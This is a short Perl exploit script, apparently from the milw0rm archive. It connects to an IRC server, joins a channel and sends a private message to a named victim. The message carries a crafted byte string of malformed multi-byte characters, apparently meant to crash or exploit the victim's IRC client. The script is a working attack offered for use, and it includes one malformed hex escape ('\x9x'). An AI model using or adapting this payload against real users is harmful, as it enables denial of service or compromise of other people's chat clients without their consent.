#!/usr/bin/perl

# rewritten because perl is more elegant than php
# payload taken from original that ratboy submitted

use strict;
use Net::IRC;

my ($nick, $server, $port, $channel, $victim) = @ARGV;

my $irc = new Net::IRC;
my $connect = $irc -> newconn (Nick => "$nick",
Server => "$server",
Port => $port,
Ircname=> 'whatever')
or die "$0: Error\n";

my $payload = "\x9x\xF0\x92\x8D\x85\xF1\xA5\x90\xB4\xF1\x96\x9E\x85\xF1\xA6\x8D\xA5\xF1\xB8\xA5\x85\xF1\xA7\x95\xA8\x29\xF2\x95\x95\x82";        

sub on_connect {
	my $self = shift;
	
	$self->join("#".$channel);
	$self->privmsg($victim, "$payload");
}

$connect->add_handler('376', \&on_connect);
$irc->start();

# milw0rm.com [2006-08-08]